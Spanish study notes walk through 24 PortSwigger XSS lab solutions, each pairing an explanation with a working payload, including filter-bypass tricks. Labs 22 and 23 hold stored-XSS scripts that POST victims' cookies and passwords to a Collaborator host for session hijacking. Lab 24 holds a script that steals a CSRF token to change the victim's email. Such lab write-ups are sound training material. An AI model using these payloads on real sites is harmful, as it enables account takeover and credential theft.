----
### QUE ES?
**XSS (Cross-Site Scripting)** es una vulnerabilidad web que permite inyectar **código JavaScript malicioso** en una aplicación para que se ejecute en el navegador de otros usuarios.
La inyección suele producirse en **inputs no validados** (formularios, parámetros URL, comentarios, etc.) que la aplicación devuelve sin sanitizar en la respuesta HTML.
Cuando el navegador interpreta ese contenido, ejecuta el script con los **permisos de la víctima**, pudiendo robar cookies, tokens de sesión, redirigir a páginas falsas o modificar el contenido.

Tipos principales:
- **Reflected XSS** (se ejecuta en la respuesta inmediata).
- **Stored XSS** (queda almacenado en la aplicación).
- **DOM-based XSS** (la manipulación ocurre en el lado del cliente).
#### PASOS: 
- *MIRAR LOS SCRIPTS* `CTRL + SHIFT + C` 
- *MIRAR SI SE VE REFLEJADO EN ALGUN SITIO LO QUE INTRODUCIMOS*
- *MIRAR LAS LIBRERIAS QUE SE USAN Y SUS RESPUESTAS EN HTTP HISTORY*
- *MIRAR SI LOS INPUTS SE REFLEJAN EN LOS LINKS DE LA CABECERA*
-----
### LAB1: XSS BASICO EN BUSCADOR REFLEJADO
- `<script>alert(0)</script>` En el buscador

### LAB2: XSS BASICO EN BUSCADOR STORED
- `<script>alert(0)</script>` En el comentario

### LAB3: DOM XSS IN *document.wrIte* SINK USING LOCATION.SEARCH
 `document.write()` es un método de JavaScript que **inserta directamente código HTML en el documento mientras la página se está cargando**.

Si el contenido que escribe depende de datos controlados por el usuario y no se valida correctamente, puede producirse un **XSS**.
En ese caso, un atacante podría **cerrar la etiqueta HTML que se esté generando e inyectar su propio código**, por ejemplo añadiendo un `<script>...</script>`, logrando que el navegador lo ejecute como parte legítima de la página.
- `"><script>alert(0)</script>`
- `"<svg onload=alert(0)>` → *bypasss* si hay algo que nos borre etiqueta *script*.
### LAB4: DOM XSS IN *innerHTML* SINK USING LOCATION.SEARCH
`innerHTML` es una propiedad del DOM que permite **leer o modificar el contenido HTML interno de un elemento**. Si el valor asignado a `innerHTML` contiene **datos controlados por el usuario** y no se filtran correctamente, se puede producir un **XSS**. EJEMPLO: `element.innerHTML = location.search;`
- `? <img src=1 onerror=alert(1)>`
### LAB5: DOM XSS IN *JQuery anchor href* ATTRIBUTE SINK USING LOCATION.SEARCH
En la funcionalidad **Submit feedback**, el parámetro `returnPath=/` puede modificarse antes de enviarse la petición.
Si inspeccionamos la respuesta con las herramientas de desarrollador (`Ctrl + Shift + C`), observamos que en el HTML generado existe un **atributo `href` cuyo valor depende directamente del parámetro `returnPath`**. Es decir, el backend inserta nuestro input dentro de un enlace sin validación ni sanitización.

Si el `href` acepta esquemas arbitrarios, se puede inyectar algo como:
- `javascript:alert(document.cookie)

`javascript:alert(document.cookie)` es una **URL con esquema `javascript:`**.
- **`javascript:`** → Indica al navegador que, en lugar de navegar a una web, debe **ejecutar código JavaScript**.
### LAB6: DOM XSS IN QUERY SELECTOR SINK USING A HASHCHANGE EVENT
La página utiliza: `$(window).on('hashchange', function() { ... })`

Esto significa que ejecuta código cada vez que cambia el fragmento de la URL (`#algo`).  

`<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"> </iframe>` en el exploit server

- El **iframe** carga la página vulnerable.
- Cuando termina de cargar (`onload`), modifica su propia URL añadiendo un payload al `#`.
- Al cambiar el `hash`, se dispara el evento `hashchange`.
- La aplicación procesa el nuevo `hash` y lo inserta en el DOM.
- El navegador interpreta:
    `<img src=x onerror=print()>`
- Como la imagen falla al cargar (`src=x`), se ejecuta `onerror=print()`.
### LAB7: REFLECTED XSS INTO ATTRIBUTE WITH ANGLE BRACKETS HTML-encodec
En la página observamos que el término de búsqueda se refleja dentro de un `<input>` en el atributo `value`: `<input type="text" value="BUSQUEDA_USUARIO">`
El valor está entre **comillas dobles**, y no se escapan correctamente los caracteres especiales.  
Esto permite cerrar el atributo e inyectar uno nuevo como: `" onmouseover="alert(1)`

El resultado queda así:
`<input type="text" value="" onmouseover="alert(1)">`
- `"` → cierra el atributo `value`.
- `onmouseover="alert(1)` → añade un nuevo atributo con un evento JavaScript.
- El elemento ahora ejecuta código cuando el usuario pasa el ratón por encima.
### LAB8: STORED XSS INTO ANCHOR **href** ATTRIBUTE WITH DOUBLE QUOTES HTTML-ENCODED
La aplicación permite añadir comentarios con un campo **“Website”**.  Mirar desde **burp** si lo que introducimos se almacena en un *href*
El valor introducido se guarda en la base de datos y después se inserta en el HTML así: `<a href="VALOR_WEBSITE">NombreAutor</a>`

La vulnerabilidad está en que el valor del `href` **no se valida ni restringe el esquema**, permitiendo usar `javascript:`.

- `javascript:alert(1)`

Resultado en el HTML: `<a href="javascript:alert(1)">Autor</a>`
Cuando un usuario hace clic en el nombre del autor, el navegador ejecuta el JavaScript → **Stored XSS**.
### LAB9: REFLECTED INTO A **JAVASCRIPT STRING** WITH ANGLE BRACKETS HTML-ENCODED
La aplicación inserta el término de búsqueda dentro de un bloque `<script>` así: `var searchTerms = 'USER_INPUT';`

El valor está delimitado por **comillas simples** y no se escapan correctamente los caracteres especiales. Mientras que dentro del `document.write` si se sanitiza.
La idea es meter `'-alert(0)-'` en el search.

El código resultante en el navegador queda:`var searchTerms = ''-alert(0)-'';`
- `'` → cierra la cadena original.
- `-alert(0)-` → se ejecuta como expresión matemática JavaScript.
- El resto mantiene la sintaxis válida.

Aunque la expresión final produzca `NaN`, eso es irrelevante:  
**`alert(0)` ya se ha ejecutado durante la evaluación del script.**
### LAB10: DOM XSS IN **document.write** SINK USING SOURCE LOCATION.SEARCH INSIDE A SELECTED ELEMENT
En la página del producto, el JavaScript:
1. Lee el parámetro `storeId` desde `location.search`.
2. Usa `document.write()` para generar dinámicamente una nueva opción dentro del `<select>` del comprobador de stock.

Ejemplo conceptual:

`document.write('<option value="' + storeId + '">' + storeId + '</option>');`

Si  buscamos en la url: `product?productId=1&storeId=test123` Nuestro input se inserta directamente dentro del `<select>` sin sanitización.

`product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

(Decodificado sería:)
`"></select><img src=1 onerror=alert(1)>`

Que sucede que cerramos la etiqueta del select y metemos en el DOM una imagen maliciosa que al dar error ejecuta el alert.
`<option value=""></select><img src=1 onerror=alert(1)>`
### LAB11: DOM XSS IN ANGULARJS EXPRESION WITH ANGLE BREACKETS 
En AngularJS (v1.x), cuando un elemento tiene `ng-app`, el framework: → **VER QUE ES ANGULARJS EN WAPPALIZER**
- Escanea el HTML.
- Evalúa cualquier cosa que esté dentro de `{{ expresión }}`.
- Sustituye el resultado en el DOM.
Ejemplo para debug: `{{ 7 * 7 }}`
La idea es meter: `{{$on.constructor('alert(1)')()}}` 
### LAB12: REFLECTED DOM XSS
Vemos que la web carga `search-results.js`.  
Con Burp (HTTP History) vemos que la búsqueda se refleja en una **respuesta JSON** tipo:

`{"searchTerm":"XSS","results":[]}`

Revisando el JS vemos que esa respuesta se procesa con `eval()` → 🔥 sink peligroso.
El servidor escapa las `"` pero **no escapa las `\`**.
La idea es romper el string del JSON usando un backslash para cancelar el escape de comillas.
Payload: `\"-alert(1)}//
- `\"` → rompe el escape
- `-alert(1)` → ejecuta JS
- `}` → cierra el objeto
- `//` → comenta el resto
### LAB13: STORED DOM XSS
Vemos que la web carga `loadCommentsWithVulnerableEscapeHtml.js` → este escapa con:
`return html.replace('<', '&lt;').replace('>', '&gt;');` pero como usa *replace* sin */g* solo escapa la primera coincidencia
Payload: `<><img src=0 onerror=alert(0)>` ya que el filtro **solo reemplaza el primer `<` y el primer `>`**
### LAB14: REFLECTED XSS INTO HTML CONTEXT WITH MOSTS TAGS AND ATTRIBUTES BLOCKED
Si tras intentar meter un `<img src=1 onerror=print()>` → nos bloquea, podemos probar a fuzzear etiquetas y atributos
Desde el intruder fuzzeamos en `<§§>` → cheat sheet etiquetas https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
Repetir lo mismo para los atributos en `<body §§=1>`
Payload → `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
Al cargarse y redimensionarse el iframe → se ejecuta `print()`.
### LAB15: REFLECTED XSS INTO HTML CONTEXT WITH MOSTS ALL TAGS BLOCKED EXCEPT CUSTOM ONES
HTML5 permite usar etiquetas personalizadas (no estándar), como `<xss>`, ya que el navegador las crea igualmente en el DOM; esto se usa para bypass cuando el filtro bloquea etiquetas comunes pero no nombres inventados.

En el payload, `id=x` permite referenciar el elemento con `#x` en la URL, `tabindex=1` lo hace focusable, y `onfocus=...` ejecuta el JavaScript cuando el elemento recibe el foco.
`<script>`
	`location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';`
`</script>`
### LAB16: REFLECTED XSS WITH SOME SVG MARKUP ALLOWED
Si tras intentar meter un `<img src=1 onerror=print()>` → nos bloquea, podemos probar a fuzzear etiquetas y atributos
Desde el intruder fuzzeamos en `<§§>` → cheat sheet etiquetas https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
Repetir lo mismo para los atributos en `<svg> <animatransform§§=1>`
Payload → `"><svg><animatetransform onbegin=alert(1)>`
`">` → cierra un atributo o string HTML donde se estaba insertando el input, permitiendo salir del contexto original.  
`<svg>` → abre un elemento SVG (a veces permitido cuando `<script>` está bloqueado).  
`<animatetransform>` → es una etiqueta SVG válida que admite eventos.  
`onbegin=alert(1)` → ejecuta `alert(1)` cuando la animación comienza.
Lo que hay que buscar `https://0a0000cd0390f3c28022cbb100c7008f.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`
### LAB17: REFLECTED XSS IN CANONICAL LINK TAG
Tenemos que asumir que un usuario va a pulsar alguna de las combinaciones de teclas:
- On Windows: `ALT+SHIFT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`
Si vemo desde `Ctrl + U` → en las cabeceras que lo que buscamos por url se ve reflejado, podemos intentar escaparnos y añadir atributos:
`<link rel="canonical" href='https://0ae500070419da9f802b1c5700c70018.web-security-academy.net/?loquesea'/>`
Payload → `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`
de esta forma nos queda algo como: 
`<link rel="canonical" href='https://0ae500070419da9f802b1c5700c70018.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>`
- `accesskey='x'` asigna la tecla **X** como atajo de teclado para ese elemento. Cuando el usuario pulsa la combinación correspondiente (según el sistema y navegador), el elemento se “activa”.
- `onclick='alert(1)'` define el código JavaScript que se ejecuta cuando el elemento recibe esa activación. Al pulsar el access key, se dispara el evento `onclick` y se ejecuta `alert(1)`.
### LAB18: REFLECTED XSS INTO A JAVASCRIPT STRING WITH SINGLE QUOTE AND BACKSLASH ESCAPED
Si nos encontramos un script que escapa las comillas como: 
`var searchTerms = 'test\'payload';document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
Podemos probar a: `</script><script>alert(0)</script>`
### LAB19: REFLECTED XSS INTO A JAVASCRIPT STRING WITH ANGLE BRACKETS AND DOUBLE QUOTES HTML-ENCODED 
Si nos encontramos un script que escapa las comillas y encodea `><` y `""` como: 
`var searchTerms = 'test\'payload';document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
Podemos probar: `\'-alert(0)//`
- como no escapa `\`podemos usarlo para evitar que se escape `'`
- `-alert(0)` al ser una expresion matematica se ejecuta
- `//` comentan el resto 
### LAB20: STORED XSS INTO **ONCLICK** EVENT WITH ANGLE BRACKETS AND DOUBLE CUOTES ENCODEC AND SINGLE QUOTES AND BACKSLASH ESCAPED
Si vemos que al crear un comentario el apartado web se ve reflejado asi:
`<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">`
define un enlace `<a>` que, al hacer clic, ejecuta JavaScript antes (o además) de navegar.
- `id="author"` → identifica el elemento en el DOM.
- `href="http://test.com"` → destino al que irá el navegador al hacer clic.
- `onclick="..."` → código JS que se ejecuta cuando el usuario hace clic.
Podemos hacer:
`http://foo?&apos;-alert(1)-&apos;`
De forma que escapamos de que se encodee la comilla
- `&apos`→ es comilla simple
- `-alert(1)-` → comando que se ejecuta
### LAB21: REFLECTED XSS INTO A TEMPLATE LITERAL WITH ANGLE BRACKETS, SINGLE, DOUBLE QUOTES, BACKSLASH AND BACKTICKS UNICODE-ESCAPED
Si vemos que nuestro input se ve reflejado en un script que usa backslash `→``
`<script>
	``var message = `0 search results for 'XSS'`;document.getElementById('searchMessage').innerText = message;``
`</script>`
Payload:
`${alert(0)}` → ya que de esta forma se ejecutan comandos.
### LAB22: EXPLOITING CROSS-SITE SCRIPTING TO STEAL COOKIES
En Burp Suite Professional, ve a la pestaña **Collaborator**.  
Haz clic en **"Copy to clipboard"** para copiar un payload único de Burp Collaborator al portapapeles.

Envía el siguiente payload en un comentario del blog, insertando tu subdominio de Burp Collaborator donde se indica:

`<script>  
`fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {  
`method: 'POST',  
`mode: 'no-cors',  
`body: document.cookie  
`});  
`</script>

Este script hará que cualquier persona que vea el comentario envíe una solicitud POST con su cookie a tu subdominio en el servidor público de Collaborator.

Vuelve a la pestaña **Collaborator** y haz clic en **"Poll now"**.  
Deberías ver una interacción HTTP. Si no aparece nada, espera unos segundos y vuelve a intentarlo.

Anota el valor de la cookie de la víctima que aparece en el cuerpo del POST.

Recarga la página principal del blog usando Burp Proxy o Burp Repeater para reemplazar tu propia cookie de sesión por la que capturaste en Burp Collaborator. Envía la petición para resolver el laboratorio.

Para demostrar que has secuestrado correctamente la sesión del usuario admin, puedes usar esa misma cookie en una petición a `/my-account` para cargar la página de cuenta del administrador.
### LAB23: EXPLOITING CROOS-SITE SCRIPTING TO CAPTURE PASSWORDS
Usando Burp Suite Professional, ve a la pestaña **Collaborator**.  
Haz clic en **“Copy to clipboard”** para copiar un payload único de Burp Collaborator al portapapeles.

Envía el siguiente payload en un comentario del blog, insertando tu subdominio de Burp Collaborator donde se indica:

`<input name=username id=username>  
`<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{  
`method:'POST',  
`mode: 'no-cors',  
`body:username.value+':'+this.value  
`});">

Este código hará que cualquiera que vea el comentario envíe una solicitud POST que contiene su nombre de usuario y contraseña a tu subdominio del servidor público de Collaborator.
Vuelve a la pestaña **Collaborator** y haz clic en **“Poll now”**. Deberías ver una interacción HTTP. Si no aparece ninguna, espera unos segundos y vuelve a intentarlo.
Anota el valor del nombre de usuario y contraseña de la víctima en el cuerpo del POST.
Usa esas credenciales para iniciar sesión como el usuario víctima.
### LAB24: EXPLOITING XSS TO BYPASS CSRF DEFENSES
Inicia sesión con las credenciales proporcionadas. En tu página de cuenta verás la función para actualizar el email.
Si revisas el código fuente:
- Hay que enviar una petición **POST** a `/my-account/change-email` con el parámetro `email`.
- Existe un token **anti-CSRF** en un input oculto llamado `token` (csrf).

Esto significa que el exploit debe:
1. Cargar la página de cuenta.
2. Extraer el token CSRF.
3. Usarlo para cambiar el email de la víctima.
Envía el siguiente payload en un comentario del blog:
`<script>  
`var req = new XMLHttpRequest();  
`req.onload = handleResponse;  
`req.open('get','/my-account',true);  
`req.send();  
`function handleResponse() {  
`    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
`    var changeReq = new XMLHttpRequest();  
`    changeReq.open('post', '/my-account/change-email', true);  
`    changeReq.send('csrf='+token+'&email=test@test.com')  
`};  
`</script>

Esto hará que cualquiera que vea el comentario envíe una petición POST para cambiar su email a `test@test.com`.